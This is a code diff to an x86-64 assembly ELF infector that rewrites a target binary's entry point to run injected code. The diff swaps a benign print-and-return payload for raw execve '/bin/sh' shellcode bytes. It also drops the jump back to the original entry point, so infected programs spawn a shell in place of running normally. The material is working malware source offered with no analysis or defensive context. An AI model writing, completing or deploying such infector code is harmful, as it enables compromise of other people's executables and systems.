@@ -16,7 +16,7 @@ section .data
   headerMessage db "Im in a PH segment", 0xA ; Message to print
   headerMessagelen equ $ - headerMessage         ; Message length
 
-  payload_message db "Nothing happened here ...", 0xA
+  payload_message db 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05
   payload_msg_len equ $ - payload_message
 
 
@@ -278,6 +278,7 @@ loop_ph:
 
     ; Update entry point
     mov rdi, ELF_Header               ; ELF header buffer
+    mov rax, [ph_entry + 0x10]
     mov qword [rdi + 0x18], rax       ; Set e_entry to new virtual address
 
     ; Write updated ELF header
@@ -302,15 +303,8 @@ done_ph:
     ret
 
 payload:
-    mov rax, 1                        ; syscall: write
-    mov rdi, 1                        ; stdout
-    lea rsi, [payload_message]
-    mov rdx, payload_msg_len
-    syscall
-
-    ; Jump to original entry point
-    mov rbx, [e_entry_point]
-    jmp rbx
+    ; Shellcode to execute /bin/sh
+    db 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05
 
 ; -----------------------------
 ; Function: write_at_offset
